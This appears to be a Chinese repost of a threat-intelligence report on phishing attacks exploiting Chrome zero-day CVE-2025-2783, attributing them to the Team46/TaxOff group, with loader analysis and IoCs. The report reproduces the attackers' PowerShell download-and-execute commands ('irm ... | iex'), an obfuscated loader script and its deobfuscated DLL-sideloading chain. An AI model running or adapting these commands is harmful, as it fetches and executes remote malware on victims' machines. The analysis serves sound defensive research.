> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247531081&idx=1&sn=52089fe73bfabf713e03710a33a396ce

#  CVE-2025-2783 谷歌Chrome零日漏洞（沙盒逃逸）的攻击分析  
 Ots安全   2025-06-19 09:17  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
介绍  
  
2025年3月，Positive Technologies专家安全中心（PT ESC）威胁情报部门分析了一起利用谷歌Chrome零日漏洞（沙盒逃逸）的攻击，该漏洞大约在同一时间被注册，并被追踪为 CVE-2025-2783。卡巴斯基的研究人员描述了该漏洞的利用方式和攻击过程，但后续的感染链仍未确定。  
  
在本报告中，我们认为此次攻击可能与 TaxOff 组织有关，我们在 之前的研究中也曾提到过该组织。本报告还提供数据表明，TaxOff 实际上与 我们之前发现的另一个组织Team46是同一个组织。  
  
Team46？  
  
引起专家关注的攻击发生在2025年3月中旬。最初的攻击媒介是一封包含恶意链接的钓鱼邮件。受害者点击该链接后，触发了一键漏洞利用 (CVE-2025-2783)，导致安装了 TaxOff使用的Trinper后门。该钓鱼邮件伪装成Primakov Readings论坛的邀请，链接指向一个托管该漏洞利用的虚假网站。该邮件的文本可在 卡巴斯基报告中找到。  
  
在对那次攻击进行调查期间，还发现了另一起可追溯到2024年10月的攻击，该攻击也始于一次网络钓鱼活动。恶意邮件中包含一份邀请函，邀请人们参加一场名为“现代世界中的联盟国家安全”的国际会议。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad4spib6WVQc03kEYD6LB8Iwbtzdk3KJZQczKEVicViamYBDuHbvVkOtR2FcJ0DgZHAgkDm6Wic97kRpw/640?wx_fmt=png&from=appmsg "")  
  
图 1. 2024 年 10 月攻击中使用的诱饵文档  
  
电子邮件的结构和风格与 2025 年 3 月的攻击中观察到的非常相似。  
  
这封2024年10月的电子邮件包含以下链接：https://mil-by[.]info/#/i?id=[REDACTED]。点击该链接会下载一个存档，其中包含一个快捷方式，该快捷方式使用以下命令启动powershell.exe ：  
  

```
-w minimized -c irm https://ms-appdata-query.global.ssl.fastly.net/query.php?id=[REDACTED] | iex
```

  
  
此前，我们在 Team46 攻击中看到过类似的命令：  
  

```
-w Minimized -ep Bypass -nop -c&#34;irm https://infosecteam.info/other.php?id=jdcz7vyqdoadr31gejeivo6g30cx7kgu | iex&#34;
```

  
  
执行命令后下载的 PowerShell 脚本也与Team46 使用的脚本之一类似。下载的脚本如下所示：  
  

```
powershell.exe -w minimized -ep bypass -noni -nop -c Invoke-Expression $([char](10+0x18+0x2)+[char](100)+[char](0x33+0x18+0x21)+[char](0x64)+[char](99)+[char](56+0x29)+[char](111)+[char](12+0x43+0x29)+[char](22+99)+[char](0x25+56+28)+[char](100)+[char](0x70)+[char](20+0x2e+41)+[char](0x4c+0x2c)+[char](2+103)+[char](0+119)+[char](0x53+21)+[char](16+83)+[char](108)+[char](11+0x5c)+[char](105)+
[REDACTED]
```

  
  
去混淆后，脚本如下所示：  
  

```
iwr 'https://ms-appdata-fonts.global.ssl.fastly.net/docs/minsk2025v1/[REDACTED]/document.pdf' -OutFile $env:LOCALAPPDATA\Temp\umawbfez-bkw5-f85a-3idl-3z4ql69v8it0.pdf -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0 Safari/537.36 Edge/125.0.0.0'; & &#34;$env:LOCALAPPDATA\Temp\umawbfez-bkw5-f85a-3idl-3z4ql69v8it0.pdf&#34;; if(!(Test-Path -Path &#34;$env:LOCALAPPDATA\Microsoft\windowsapps\.Appdata\winsta.dll&#34;)){ if(!(Test-Path -Path &#34;$env:LOCALAPPDATA\Microsoft\WindowsApps\7za.exe&#34;)){iwr &#34;https://ms-appdata-fonts.global.ssl.fastly.net/docs/minsk2025v1/[REDACTED]/pkcs7&#34; -OutFile &#34;$env:LOCALAPPDATA\Microsoft\WindowsApps\7za.exe&#34; -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0 Safari/537.36 Edge/125.0.0.0'};iwr &#34;https://ms-appdata-main.global.ssl.fastly.net/asset.php?query=$env:COMPUTERNAME&#34; -OutFile &#34;$env:LOCALAPPDATA\Microsoft\WindowsApps\\Appdata.zip&#34; -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0 YaBrowser/28.4.1.2 Safari/537.36';& &#34;$env:LOCALAPPDATA\Microsoft\WindowsApps\7za.exe&#34; x -p'F5gk0a,20g'&#34;$env:LOCALAPPDATA\Microsoft\WindowsApps\\Appdata.zip&#34; -o&#34;$env:LOCALAPPDATA\Microsoft\WindowsApps\&#34;;copy &#34;c:\windows\system32\rdpclip.exe&#34; &#34;$env:LOCALAPPDATA\Microsoft\WindowsApps\.Appdata\rdpclip.exe&#34;; & &#34;$env:LOCALAPPDATA\Microsoft\WindowsApps\.Appdata\rdpclip.exe&#34;;del &#34;$env:LOCALAPPDATA\Microsoft\WindowsApps\\Appdata.zip&#34;;}else{copy &#34;c:\windows\system32\rdpclip.exe&#34; &#34;$env:LOCALAPPDATA\Microsoft\WindowsApps\.Appdata\rdpclip.exe&#34;;& &#34;$env:LOCALAPPDATA\Microsoft\WindowsApps\.Appdata\rdpclip.exe&#34;}
```

  
  
为了进行比较，以下是在 Team46 攻击中发现的类似脚本：  
  

```
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -w Minimized -ep Bypass -nop -c &#34;iwr 'https://srv480138.hstgr.cloud/uploads/scan_3824.pdf' -OutFile $env:LOCALAPPDATA\Temp\399ha122-tt9d-6f14-s9li-lqw7di42c792.pdf -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.';$env:LOCALAPPDATA\Temp\399ha122-tt9d-6f14-s9li-lqw7di42c792.pdf;iwr 'https://srv480138.hstgr.cloud/report.php?query=$env:COMPUTERNAME' -OutFile $env:LOCALAPPDATA\Temp\AdobeUpdater.exe -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.1 YaBrowser/23.11.0.0 Safari/537.36';$env:LOCALAPPDATA\Temp\AdobeUpdater.exe;&#34;
```

  
  
如您所见，受害者计算机上的诱饵文档使用了相同的命名模式（umawbfez-bkw5-f85a-3idl-3z4ql69v8it0.pdf 和 399ha122-tt9d-6f14-s9li-lqw7di42c792.pdf）。在这两种情况下，下载诱饵文档时都使用 Edge 用户代理，下载有效载荷时则使用 Yandex 浏览器用户代理。此外，在这两种情况下，计算机名称都通过 查询参数传递。  
  
这两起案件之间唯一真正的区别在于有效载荷。Dr.Web描述的早期攻击利用了Yandex 浏览器中的 DLL 劫持漏洞 ( CVE-2024-6473 )，攻击者替换了合法的Wldp.dll库来启动恶意载荷。在 2024 年 10 月的攻击中，攻击者利用了 同样易受 DLL 劫持攻击的 rdpclip.exe系统组件，并替换了winsta.dll系统库。  
  
有趣的是，winsta.dll是 TaxOff 组织使用的 Trinper 后门的加载器，我们 之前曾描述过该后门。该后门使用了 common-rdp-front.global.ssl.fastly.net C2 服务器。  
  
如果不是 2024 年 9 月记录了一次类似的攻击，这或许会被视为巧合。攻击者发送的网络钓鱼电子邮件包含一个名为Корпоративного Центра ПАО «Ростелеком».zip 的存档，其中包含一个名为Ростелеком.pdf.lnk的快捷方式，该快捷方式使用 Team46 的典型命令启动powershell.exe ：  
  

```
-whid -ep Bypass -nop -c&#34;irm https://srv510786.hstgr.cloud/ordinary.php?id=9826fbb409f65dc6b068b085551bf4f3 | iex&#34;
```

  
  
攻击中使用的诱饵文件伪装成俄罗斯最大的数字服务提供商 Rostelecom 发出的消息，通知即将进行维护停机。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad4spib6WVQc03kEYD6LB8IwCmatkUXwpMCSktu9DHEX5sjW3Liacx4jxGwBO5DdrxTUBTRUMJ840UA/640?wx_fmt=png&from=appmsg "")  
  
图 2. 2024 年 9 月攻击中使用的诱饵文档  
  
消息末尾的电话号码是 Team46 样式（我们在 之前的文章中讨论过）：它是不正确的，由随机数字序列组成。   
  
此次攻击的有效载荷是 AdobeARM.exe文件，它恰好是Dr.Web 描述的首个已知 Team46 攻击中使用的后门的加载器。事实上，在分析其中一起事件时，我们在带有 Trinper 后门的系统上发现了这个后门，也称为AdobeARM.exe。  
  
Trinper装载机  
  
在 DllMain 函数中，加载程序初始化一个结构，该结构包含加密的最终有效载荷、用于进一步检查的哈希列表以及辅助字段（例如最终有效载荷的大小）。初始化结构后，加载程序将启动一个线程，该线程包含用于解密和启动最终有效载荷的逻辑。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad4spib6WVQc03kEYD6LB8IwxiaXfrJqYDqAWOsmQh8rGMDMVG0qtZlND6AHIgt9ZPbxX7LQMGDI2rg/640?wx_fmt=png&from=appmsg "")  
  
图 3. 结构初始化和线程启动  
  
为了描述解密过程，我们创建了一个图表，显示加密层及其序列以及相应的解密算法和密钥。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad4spib6WVQc03kEYD6LB8IwGG9tJWicNk1KTy2Pc0VKPdic8rXJkNLweQNhmKQb2L8nkO4OfW8n0DbA/640?wx_fmt=png&from=appmsg "")  
  
图 4. 加密层  
  
在线程内部，加载器循环操作以解密第一层加密，然后将其用作第二层的解密器。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad4spib6WVQc03kEYD6LB8IwEKf6ACKbreJiaTv8nFzhjGUEfl6jfADjSKdWyarTLE2wZ4tbejfbQkw/640?wx_fmt=png&from=appmsg "")  
  
图5. 第一层和第二层的解密  
  
一旦第二层解密，控制权就会转移到第二层。该层使用自定义控制流展平技术进行混淆。它动态解析所有必要的 WinAPI 函数，然后将控制权转移到主函数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad4spib6WVQc03kEYD6LB8Iw5ARTU3SicCsNYBk3xmibgsYdSI2xwzZtTJTuqRjw4MuQGBKqvoZ5mOwA/640?wx_fmt=png&from=appmsg "")  
  
图 6. 混淆的控制流  
  
在此阶段，加载器会检查是否存在调试器，并确保其在正确的环境中执行。加载器首先验证其是否在特定进程的上下文中执行。为此，它使用改进的 BLAKE2b 哈希算法来计算当前进程名称的哈希值。然后将该哈希值与嵌入的哈希值之一进行匹配；如果加载器未在正确的进程中执行，则终止其执行。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad4spib6WVQc03kEYD6LB8IwqyMmbiaJHWQ0DlXlybbyicJfCycafXTtiamluGVW09dibyaMFicIyQxvAQA/640?wx_fmt=png&from=appmsg "")  
  
图 7. 检查是否在正确的流程内执行  
  
接下来，加载程序通过调用 GetSystemFirmwareTable 函数获取固件 UUID。（该 UUID 随后用于有效载荷解密过程，这意味着恶意有效载荷只能在目标系统上解密。目前，我们还无法确定攻击者是如何识别用于生成恶意软件的机器 UUID 的。）之后，加载程序会对堆执行调试检查。如果检查失败，它会转移预期的控制流，将 UUID 值随机化，并将控制权转入无限解密循环。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad4spib6WVQc03kEYD6LB8IwYdrDftHkKrnuzg7swtoX8ojUSU0rMEl5DTh3XcxRA4NQ0td581C8VA/640?wx_fmt=png&from=appmsg "")  
  
图8.调试检查  
  
如果所有检查都成功通过，UUID 将被传输到实现 ChaCha20 算法第一轮的函数中，以生成密钥。加载程序使用此密钥，使用 ChaCha20 算法解密第三层加密，并对解密数据执行完整性检查。接下来，加载程序使用 PEB 结构中的 ImagePathName 作为密钥解密第四层加密。第四层的数据用于生成第五层的最终解密密钥（与 UUID 的情况类似）。此阶段还包括对解密字节的完整性检查。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad4spib6WVQc03kEYD6LB8Iw65fZjEb7j6IbqlficK1JFKyeKWKtibUvQiazicibC7jeHiaby3LeXFuCLia9A/640?wx_fmt=png&from=appmsg "")  
  
图 9. ImagePathName 的使用  
  
如果密钥解密成功，加载器就会使用它来解密最后一层加密，而这最后一层加密恰好就是 甜甜圈加载器。   
  
我们还遇到了使用 Cobalt Strike 而不是 Donut 的变种。如果最终加载器是 Donut，则有效载荷为 Trinper；否则，有效载荷为 Cobalt Strike。Trinper 的功能保持不变。  
  
辅助工具  
  
调查发现，攻击者还使用自行编写的工具对受害者系统进行侦察。所有工具均采用.NET编写，并通过命名管道传输获取的数据。这些工具包括：  
- dirlist.exe 在系统中搜索文件。  
  
- ProcessList.exe 获取正在运行的进程列表。  
  
- ScreenShot.exe 用于捕获屏幕截图。  
  
Team46 与 TaxOff 的比较  
  
让我们考虑一下表明 Team46 和 TaxOff 可能是同一团体的事实。  
  
PowerShell 命令和 URL 模式  
  
正如报告开头所述，两个组织都使用了类似的 PowerShell 命令和脚本，包括类似的 URL 模式。  
  
Team46 在 2024 年 2 月使用的命令：  
  

```
-w Minimized -ep Bypass -nop -c&#34;irm https://infosecteam.info/other.php?id=jdcz7vyqdoadr31gejeivo6g30cx7kgu | iex&#34;
```

  
  
Team46 在 2024 年 9 月使用的命令：  
  

```
-whid -ep Bypass -nop -c&#34;irm https://srv510786.hstgr.cloud/ordinary.php?id=9826fbb409f65dc6b068b085551bf4f3 | iex&#34;
```

  
  
TaxOff 在 2025 年 3 月使用的命令：  
  

```
-w minimized -c irm https://ms-appdata-query.global.ssl.fastly.net/query.php?id=[REDACTED] | iex
```

  
  
  
装载机  
  
总体而言，TaxOff 使用的加载程序与 Team46 使用的Trojan.Siggen27.11306加载程序功能相同 。主要相似之处如下：  
1. 使用线程解密有效载荷。  
  
1. 使用固件 UUID 作为密钥。  
  
1. 使用 ImagePathName 作为键。  
  
1. 使用改进的ChaCha20加密算法。  
  
1. 使用改进的 BLAKE2 哈希算法。  
  
1.  使用甜甜圈装载机。  
  
基础设施  
  
两个犯罪团伙都使用了语法相似的带有连字符的域名，以模仿合法服务。例如：  
  
Team46：ms-appdata-fonts.global.ssl.fastly.net  
  
TaxOff：fast-telemetry-api.global.ssl.fastly.net  
  
结论  
  
我们的研究强烈表明，Team46 和 TaxOff 实际上是同一个 APT 组织，我们将继续将其称为 Team46。该组织利用零日漏洞，使其能够更有效地渗透安全基础设施。该组织还创建并使用复杂的恶意软件，这意味着其制定了长期战略，并打算在受感染的系统上长期驻留。  
  
IoC  
  
基于文件的 IoC  
  

```
TaxOff loader
twinapi.dll 7d3a30dbf4fd3edaf4dde35ccb5cf926 3650c1ac97bd5674e1e3bfa9b26008644edacfed 2e39800df1cafbebfa22b437744d80f1b38111b471fa3eb42f2214a5ac7e1f13
winsta.dll 07d2b50cf8ffe13a4722955ea94317aa ff01b509d72662f1d0541d37fd89165d15ad8262 f062681125a93a364618da3126c42b6e7c8f27910e954a7b8afd72455ddce328
twinapi.dll f3a70b8073ce2276af75b1cc2f18aced 197b98d7f368bfd5bd7210b5215a720b8dba83a1 b159534cd3bf2fa350edf18969ea4b07cb3cded49c40d927bac19ff390589504
WINSTA.dll 4b51f3021d8426b8356cd5751ad6ebd0 643966f0b58b2c1c9d7fead5f9d8b528ea76faaa ab42a3c6ff062147fa7bbf527f7b0b106c1514872bd1a90c8868423fa0485038

axOff Trinper
— 16f6227f760487a70a3168cf9a497ac3 20943541522cd3937b275c42016ad3e1e64e3f38 f15d8c58d8edb2ec17d35fe9d65062a767067760896eb425fc0de0d4536cc666
— 1b7b4608f2c9e0a4863a00edd60c3b78 d9fa06025ecd08fc417c9948148e7827280365f2 d622119cd68ad24f3498c54136242776d69ffe1f6b382a984616a667849c08b2
— dba17d2faa311f28e68477ea5cc1a300 39ecc624bd2d52db083424fbb3a47b0c60f5ae4e 99786a04acc05254dd35b511c4b3af34c88251f926c4ef91c215a9fce6ba8f96

Team46 loader
AdobeARM.exe ca767542f4af58fc3072e74574725ee3 c1795c171d88cbf36e36fe2d3a3feb435e24c29a fde9725923e15ca4f790c0ad4766fe7d60e6e3dae75ea8ccf04ff42f2458b4b1

Auxiliary tools
dirlist.exe 5f47e40f3a36cc06bbaec27b063cd195 8a79060165774fc8d6cf099109a043f07476aa7a 7975d287b07454b68455dd7e052eb741b5bf81712596ea00ddda2b103a99d037
ProcessList.exe d69854b4a5c324082e157f04889ba138 5dafc8e4ed184653b8cfb1769617b4e2e27168c3 185cdfd1eeef2a4063e5134653c53058f91050de8c9234740a7ddd215a2aeaed
ScreenShot.exe d003e812336221db029f02738451215c f12d9b983d5bcc93d99b8199da84e8c4240caaa5 2997647affa42eff41a27c5db54b126087a36f789c8cfc66d24a21fe7212badc
```

  
  
  
Network IoCs  
  

```
mil-by.info
primakovreadings.info
2025primakovreadings.info
primakovreadings2025.info
ads-stream-api-v2.global.ssl.fastly.net
fast-telemetry-api.global.ssl.fastly.net
browser-time-stats.global.ssl.fastly.net
rdp-query-api.global.ssl.fastly.net
rdp-statistics-api.global.ssl.fastly.net
clip-rdp-api.global.ssl.fastly.net
rdp-api-front.global.ssl.fastly.net
common-rdp-front.global.ssl.fastly.net
front-static-api.global.ssl.fastly.net
main-front-api.global.ssl.fastly.net
185.81.114.15
ms-appdata-fonts.global.ssl.fastly.net
ms-appdata-main.global.ssl.fastly.net
ms-appdata-query.global.ssl.fastly.net
```

  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
